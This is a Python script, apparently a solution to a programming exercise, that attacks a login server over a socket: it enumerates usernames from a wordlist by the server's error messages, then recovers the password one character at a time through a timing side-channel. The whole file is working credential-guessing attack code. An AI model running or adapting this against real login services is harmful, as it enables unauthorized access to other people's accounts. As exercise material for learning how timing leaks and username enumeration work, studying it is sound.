# write your code here
import socket
import sys
import string
import json
import time

# parsing arguments
ip, port = sys.argv[1:]

# connection information
address = (ip, int(port))

# message and buffer size
buffer_size = 1024

# logins path
PATH = "./logins.txt"

# alphanumeric
alphanumeric = string.ascii_lowercase + string.ascii_uppercase + string.digits


def send_creds(client, credentials, buffer=buffer_size):
    req = json.dumps(credentials, indent=4).encode()
    client.send(req)
    start = time.perf_counter()
    resp_enc = client.recv(buffer)
    end = time.perf_counter()
    time_diff = end - start
    resp = json.loads(resp_enc.decode())
    return resp, time_diff

def create_creds(login, password=" "):
    return dict(login=login, password=password)


def fetch_login(client, buffer=buffer_size, path=PATH):
    with open(path, "r") as login_file:
        login_list = (login.strip("\n") for login in login_file.readlines())
        for login in login_list:
            credentials = create_creds(login)
            resp, _ = send_creds(client, credentials, buffer)
            if resp["result"] == "Wrong password!":
                return login


def fetch_password(client, act_login, password, buffer=buffer_size):
    credentials = create_creds(act_login, password)
    resp, time_diff = send_creds(client, credentials, buffer)
    return resp["result"], time_diff


# solution
with socket.socket() as connection:

    connection.connect(address)

    # fetch username
    corr_login = fetch_login(connection, buffer_size, PATH)

    # fetch password
    success = False
    corr_pwd = ""
    while not success:
        for char in alphanumeric:
            result, time_diff = fetch_password(connection, corr_login, corr_pwd + char)
            if result == "Connection success!":
                creds = create_creds(corr_login, corr_pwd + char)
                print(json.dumps(creds))
                success = True
                break
            elif result == "Wrong password!":
                if time_diff * 10 ** 6 >= 90000:
                    corr_pwd += char
